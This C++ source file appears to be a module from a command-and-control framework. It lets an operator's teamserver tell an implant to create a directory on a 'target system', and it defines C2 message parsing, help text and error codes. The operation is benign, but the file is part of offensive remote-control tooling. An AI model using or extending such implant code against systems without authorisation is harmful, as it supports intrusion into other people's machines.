#include "MkDir.hpp"

#include <filesystem>
#include <cstring>

#include "Common.hpp"

using namespace std;
namespace fs = std::filesystem;

constexpr std::string_view moduleName = "mkDir";
constexpr unsigned long long moduleHash = djb2(moduleName);

#ifdef _WIN32
__declspec(dllexport) MkDir* MkDirConstructor()
{
    return new MkDir();
}
#else
__attribute__((visibility("default"))) MkDir* MkDirConstructor()
{
    return new MkDir();
}
#endif

MkDir::MkDir()
#ifdef BUILD_TEAMSERVER
    : ModuleCmd(std::string(moduleName), moduleHash)
#else
    : ModuleCmd("", moduleHash)
#endif
{
}

MkDir::~MkDir()
{
}

std::string MkDir::getInfo()
{
    std::string info;
#ifdef BUILD_TEAMSERVER
    info += "mkDir Module:\n";
    info += "Create a new directory on the target system.\n";
    info += "\nUsage:\n";
    info += " - mkDir <path>\n";
#endif
    return info;
}

int MkDir::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
{
#if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS)
    if (splitedCmd.size() >= 2)
    {
        std::string path;
        for (size_t i = 1; i < splitedCmd.size(); ++i)
        {
            if (!path.empty())
                path += " ";
            path += splitedCmd[i];
        }
        c2Message.set_instruction(splitedCmd[0]);
        c2Message.set_cmd(path);
    }
    else
    {
        c2Message.set_returnvalue(getInfo());
        return -1;
    }
#endif
    return 0;
}

#define ERROR_CREATE_DIRECTORY 1

int MkDir::process(C2Message &c2Message, C2Message &c2RetMessage)
{
    std::string path = c2Message.cmd();
    c2RetMessage.set_instruction(c2RetMessage.instruction());
    c2RetMessage.set_cmd(path);
    std::error_code ec;
    bool created = fs::create_directories(path, ec);
    if (!ec)
    {
        c2RetMessage.set_returnvalue(created ? "Directory created." : "Already exists.");
    }
    else
    {
        c2RetMessage.set_errorCode(ERROR_CREATE_DIRECTORY);
    }
    return 0;
}

int MkDir::errorCodeToMsg(const C2Message &c2RetMessage, std::string& errorMsg)
{
#ifdef BUILD_TEAMSERVER
    int errorCode = c2RetMessage.errorCode();
    if (errorCode > 0)
    {
        if (errorCode == ERROR_CREATE_DIRECTORY)
            errorMsg = "Failed: Could not create directory";
    }
#endif
    return 0;
}

